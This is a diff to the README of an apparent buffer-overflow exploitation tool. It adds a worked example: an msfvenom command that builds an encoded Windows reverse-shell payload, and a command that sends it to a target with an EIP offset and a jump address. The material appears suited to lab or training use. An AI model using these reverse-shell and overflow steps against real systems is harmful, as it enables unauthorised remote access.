@@ -84,22 +84,24 @@ Done! Finished sending characters to target.
 ```
 
 ### 2.4. Running an Exploit
-```sh
-$ overflow exploit --help
+Generate a RAW payload using msfvenom, for example.
 ```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 \
+    EXITFUNC=thread -b "\x00" --platform=Windows --arch=x86 -o payload.shell
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Saved as: payload.shell
 ```
-Usage: overflow exploit HOST PORT (-o|--offset OFFSET) (-a|--address ADDRESS)
-                        (-p|--payload PAYLOAD) [-p|--prefix PREFIX] 
-                        [-s|--suffix SUFFIX]
-  Attempts to execute a specified payload on target
 
-Available options:
-  HOST                     Target machine's IP address
-  PORT                     Port the target service is running on
-  -o,--offset OFFSET       The offset of the EIP register
-  -a,--address ADDRESS     Jump address for executing shellcode
-  -p,--payload PAYLOAD     Payload to be executed on target
-  -p,--prefix PREFIX       (optional) Prefix to put before payload
-  -s,--suffix SUFFIX       (optional) Suffix to put after payload
-  -h,--help                Show this help text
+Then send the payload using the exploit subcommand. Just add the hex for the
+jump point (-j|--jump) and add the offset to the EIP register (-o|--offset),
+and you're good to go.
 ```
+$ overflow exploit 127.0.0.1 4444 -o 160 -j "5f4a358f" -p path/to/payload.shell
+    ───> Sending exploit payload to target...
+Done! Finished sending exploit to target.
+```
+
